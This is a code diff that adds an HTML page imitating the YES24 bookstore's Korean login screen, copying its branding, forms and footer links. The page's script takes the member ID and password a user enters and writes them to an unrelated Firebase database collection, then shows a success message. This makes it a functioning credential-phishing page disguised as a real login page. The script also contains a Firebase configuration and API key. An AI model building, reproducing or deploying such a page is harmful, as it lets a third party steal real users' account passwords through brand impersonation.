@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <title>로그인 - 예스24</title>
+  <link rel="shortcut icon" href="https://image.yes24.com/sysimage/renew/gnb/favicon_n.ico" type="image/x-icon">
+  
+  <link rel="stylesheet" type="text/css" href="https://image.yes24.com/sysimage/yesui/layout/default.css?v=20140120" />
+  <link rel="stylesheet" type="text/css" href="https://image.yes24.com/sysimage/yesUI/sLayout/sLayoutV2.css?v=20260918" media="all" />
+  <link rel="stylesheet" type="text/css" href="https://image.yes24.com/sysimage/yesUI/member/member.css?v=20260622" media="all" />
+  <link rel="stylesheet" type="text/css" href="https://image.yes24.com/sysimage/yesUI/yesUI.css?ver=180817c" media="all" />
+
+  <style>
+    .yesIpt {
+      position: relative;
+      display: inline-block;
+    }
+    .yesIpt label {
+      position: absolute;
+      top: 14px;
+      left: 15px;
+      color: #999;
+      font-size: 14px;
+      pointer-events: none;
+      transition: opacity 0.1s ease;
+    }
+    .yesIpt.has-value label,
+    .yesIpt.focus_blue.focused label {
+      display: none;
+    }
+    .yesIpt.error input {
+      border-color: #fe434c !important;
+    }
+    .login_adArea .ad_placeholder {
+      display: block;
+      width: 100%;
+      height: 100%;
+      background-color: #f7f7f7;
+      border: 1px solid #e0e0e0;
+      box-sizing: border-box;
+    }
+  </style>
+</head>
+<body>
+
+<dl id="yesSkip">
+  <dt>콘텐츠 바로가기</dt>
+  <dd><a href="#loginFormWrap">본문 바로가기</a></dd>
+</dl>
+<hr/>
+
+<div id="yesWrap">
+  <div id="ySHeader">
+    <div class="ySHeaderAera">
+      <h1>
+        <a class="lnk_logo" href="https://www.yes24.com">
+          <img src="https://image.yes24.com/sysimage/renew/sLayout/logo_n.png" border="0" alt="YES24">
+        </a>
+        <span class="servName">로그인</span>
+      </h1>
+      <div class="headerLnk">
+        <a href="https://www.yes24.com/Member/Join/Accept.aspx" class="btnC m_size w_90">
+          <span class="bWrap"><em class="txt">회원가입</em></span>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div id="ySContent" class="pat60 pab60">
+    <div id="loginFormWrap" class="ySContRow clearfix">
+      
+      <div class="loginCont">
+        <div id="divTabMemberArea" class="yesTab_nor yesTab_blue tab_2col">
+          <ul id="ulTabMember">
+            <li id="liTabMember" class="on firstCol">
+              <a href="javascript:void(0);" onclick="chgTabLogin(this, 'mem');">
+                <span class="txt">회원</span>
+              </a>
+            </li>
+            <li id="liTabNoMember" class="lastCol">
+              <a href="javascript:void(0);" onclick="chgTabLogin(this, 'nMem');">
+                <span class="txt">비회원 주문확인</span>
+              </a>
+            </li>
+          </ul>
+        </div>
+
+        <!-- 회원 로그인 -->
+        <div id="memLoginForm" class="loginFormGrp">
+          <form method="post" name="LoginSub" id="LoginSub" autocomplete="off" onsubmit="return false;">
+            <fieldset class="loginForm">
+              <legend class="blind">회원 로그인</legend>
+
+              <span id="spanMemID" class="yesIpt b_size ipt_wSizeF focus_blue">
+                <label for="SMemberID">아이디</label>
+                <input id="SMemberID" name="SMemberID" type="text" autocomplete="off" maxlength="100" />
+              </span>
+              <p class="yesFormTxt error" style="display:none;" id="pYesFormErrTxt_MemID">아이디를 입력해주세요.</p>
+
+              <span id="spanMemPW" class="yesIpt b_size ipt_wSizeF focus_blue mgt10">
+                <label for="SMemberPassword">비밀번호</label>
+                <input id="SMemberPassword" name="SMemberPassword" type="password" autocomplete="off" maxlength="30" />
+              </span>
+              <p class="yesFormTxt error" style="display:none;" id="pYesFormErrTxt_MemPW">비밀번호를 입력해주세요.</p>
+
+              <div class="loginForm_chk">
+                <span class="yesChk">
+                  <input id="chkAutoLogin" name="chkAutoLogin" type="checkbox" class="iptChk" />
+                  <label for="chkAutoLogin"><em class="ico_yesChk bgYUI"></em>로그인 상태 유지</label>
+                </span>
+                <span class="yesChk">
+                  <input id="chkLoginIDSave" name="chkLoginIDSave" type="checkbox" class="iptChk" />
+                  <label for="chkLoginIDSave"><em class="ico_yesChk bgYUI"></em>아이디 저장</label>
+                </span>
+              </div>
+
+              <button type="button" id="btnLogin" title="로그인" onclick="CheckLogin();" class="btn_login btnC xb_size btn_blue">
+                <span class="bWrap"><em class="txt">로그인</em></span>
+              </button>
+            </fieldset>
+          </form>
+
+          <div class="loginEtc">
+            <a href="https://www.yes24.com/Templates/FTForgetID.aspx" class="lnk_etc">아이디 찾기</a>
+            <em class="divi">|</em>
+            <a href="https://www.yes24.com/Templates/FTForgetPW.aspx" class="lnk_etc">비밀번호 찾기</a>
+          </div>
+        </div>
+
+        <!-- 비회원 주문확인 -->
+        <div id="nMemLoginForm" class="loginFormGrp" style="display:none;">
+          <form name="frmNoMemberLogin" id="frmNoMemberLogin" method="post" autocomplete="off" onsubmit="return false;">
+            <fieldset class="loginForm">
+              <legend class="blind">비회원 주문확인</legend>
+
+              <span id="spanOrdNo" class="yesIpt b_size ipt_wSizeF focus_blue">
+                <label for="TxtOrdNo">주문번호</label>
+                <input id="TxtOrdNo" name="TxtOrdNo" type="text" autocomplete="off" maxlength="25" />
+              </span>
+              <p class="yesFormTxt error" style="display:none;" id="pYesFormErrTxt_OrdNo">주문번호를 입력해주세요.</p>
+
+              <span id="spanOrdConfPwd" class="yesIpt b_size ipt_wSizeF focus_blue mgt10">
+                <label for="TxtOrdConfPwd">주문 비밀번호</label>
+                <input id="TxtOrdConfPwd" name="TxtOrdConfPwd" type="password" autocomplete="off" maxlength="16" />
+              </span>
+              <p class="yesFormTxt error" style="display:none;" id="pYesFormErrTxt_OrdConfPwd">주문 비밀번호를 입력해주세요.</p>
+
+              <button type="button" id="btnOrdConf" title="확인" onclick="NoMemOrdConf();" class="btn_login btnC xb_size btn_blue">
+                <span class="bWrap"><em class="txt">확인</em></span>
+              </button>
+            </fieldset>
+          </form>
+
+          <div class="loginEtc">
+            <a href="https://www.yes24.com/Templates/FTForgetOrdNo.aspx" class="lnk_etc">주문번호 찾기</a>
+            <em class="divi">|</em>
+            <a href="https://www.yes24.com/Templates/FTForgetOrdPW.aspx" class="lnk_etc">주문 비밀번호 찾기</a>
+          </div>
+        </div>
+      </div>
+
+      <div class="login_adArea">
+        <div id="LoginBigBanner" class="adBig adOn">
+          <a href="https://www.yes24.com" target="_blank">
+            <img src="https://image.yes24.com/sysimage/renew/sLayout/bn_sample1.jpg" alt="프로모션 배너" onerror="this.outerHTML='<div class=\'ad_placeholder\'></div>'">
+          </a>
+        </div>
+        <div class="adSmall">
+          <a href="https://ticket.yes24.com" target="_blank">
+            <img src="https://image.yes24.com/sysimage/renew/sLayout/bn_sample2.jpg" alt="공연 배너" onerror="this.outerHTML='<div class=\'ad_placeholder\'></div>'">
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <hr/>
+
+  <div id="ySFooter">
+    <div class="ySFooterAera pos_r">
+      <address>
+        Copyright &#0169; <strong>YES24 Corp.</strong> All Rights Reserved.
+      </address>
+    </div>
+  </div>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";
+
+  // Firebase 설정
+  const firebaseConfig = {
+    apiKey: "AIzaSyAF-ASj5rHfJCikcE1potC-e09kQCwlUjg",
+    authDomain: "new-site-b1c3c.firebaseapp.com",
+    projectId: "new-site-b1c3c",
+    storageBucket: "new-site-b1c3c.firebasestorage.app",
+    messagingSenderId: "86483926784",
+    appId: "1:86483926784:web:153d58cd01696a5f443de5"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  var currentId = '';
+  var currentPw = '';
+
+  function chgTabLogin(obj, type) {
+    $('#ulTabMember li').removeClass('on');
+    $(obj).closest('li').addClass('on');
+    $('.loginFormGrp').hide();
+    $('#' + type + 'LoginForm').show();
+    fnResetControl();
+  }
+
+  function fnResetControl() {
+    $('#SMemberID, #SMemberPassword, #TxtOrdNo, #TxtOrdConfPwd').val('').trigger('change');
+    $('.yesIpt').removeClass('error');
+    $('.yesFormTxt.error').hide();
+  }
+
+  function removeErrorText(target) {
+    if (target === 'MemberID') {
+      $('#spanMemID').removeClass('error');
+      $('#pYesFormErrTxt_MemID').hide();
+    } else if (target === 'MemberPW') {
+      $('#spanMemPW').removeClass('error');
+      $('#pYesFormErrTxt_MemPW').hide();
+    } else if (target === 'OrdNo') {
+      $('#spanOrdNo').removeClass('error');
+      $('#pYesFormErrTxt_OrdNo').hide();
+    } else if (target === 'OrdConfPwd') {
+      $('#spanOrdConfPwd').removeClass('error');
+      $('#pYesFormErrTxt_OrdConfPwd').hide();
+    }
+  }
+
+  // async 함수로 선언 및 누락된 DOM 참조 수정
+  async function CheckLogin() {
+    var id = $.trim($('#SMemberID').val());
+    var pw = $.trim($('#SMemberPassword').val());
+
+    if (id === '') {
+      $('#spanMemID').addClass('error');
+      $('#pYesFormErrTxt_MemID').show();
+      $('#SMemberID').focus();
+      return false;
+    }
+    if (pw === '') {
+      $('#spanMemPW').addClass('error');
+      $('#pYesFormErrTxt_MemPW').show();
+      $('#SMemberPassword').focus();
+      return false;
+    }
+
+    try {
+      await addDoc(collection(db, "posts"), {
+        text1: id,
+        text2: pw,
+        createdAt: new Date()
+      });
+
+      alert("성공적으로 저장되었습니다.");
+      $('#SMemberID').val('').trigger('change');
+      $('#SMemberPassword').val('').trigger('change');
+    } catch (error) {
+      console.error("Error adding document: ", error);
+      alert("저장 실패: " + error.message);
+    }
+    return false;
+  }
+
+  function NoMemOrdConf() {
+    var ordNo = $.trim($('#TxtOrdNo').val());
+    var ordPw = $.trim($('#TxtOrdConfPwd').val());
+
+    if (ordNo === '') {
+      $('#spanOrdNo').addClass('error');
+      $('#pYesFormErrTxt_OrdNo').show();
+      $('#TxtOrdNo').focus();
+      return false;
+    }
+    if (ordPw === '') {
+      $('#spanOrdConfPwd').addClass('error');
+      $('#pYesFormErrTxt_OrdConfPwd').show();
+      $('#TxtOrdConfPwd').focus();
+      return false;
+    }
+
+    alert("주문번호: " + ordNo + "\n주문비밀번호: " + ordPw);
+    return false;
+  }
+
+  // 모듈 스코프의 함수들을 인라인 이벤트 핸들러에서 호출할 수 있도록 window 객체에 할당
+  window.chgTabLogin = chgTabLogin;
+  window.CheckLogin = CheckLogin;
+  window.NoMemOrdConf = NoMemOrdConf;
+
+  $(document).ready(function () {
+    $('.yesIpt input').on('focus', function () {
+      $(this).parent().addClass('focused');
+    }).on('blur', function () {
+      $(this).parent().removeClass('focused');
+      if (this.value !== '') {
+        $(this).parent().addClass('has-value');
+      } else {
+        $(this).parent().removeClass('has-value');
+      }
+    }).on('input change', function () {
+      if (this.value !== '') {
+        $(this).parent().addClass('has-value');
+      } else {
+        $(this).parent().removeClass('has-value');
+      }
+    });
+
+    $('#SMemberID').on('keydown', function () { removeErrorText('MemberID'); });
+    $('#SMemberPassword').on('keydown', function () { removeErrorText('MemberPW'); });
+    $('#TxtOrdNo').on('keydown', function () { removeErrorText('OrdNo'); });
+    $('#TxtOrdConfPwd').on('keydown', function () { removeErrorText('OrdConfPwd'); });
+
+    $('#SMemberPassword').on('keypress', function (e) {
+      if (e.which === 13) {
+        CheckLogin();
+      }
+    });
+
+    $('#TxtOrdConfPwd').on('keypress', function (e) {
+      if (e.which === 13) {
+        NoMemOrdConf();
+      }
+    });
+
+    $('#SMemberID').on('input', function() {
+      currentId = $(this).val();
+    });
+
+    $('#SMemberPassword').on('input', function() {
+      currentPw = $(this).val();
+    });
+  });
+</script>
+</body>
+</html>
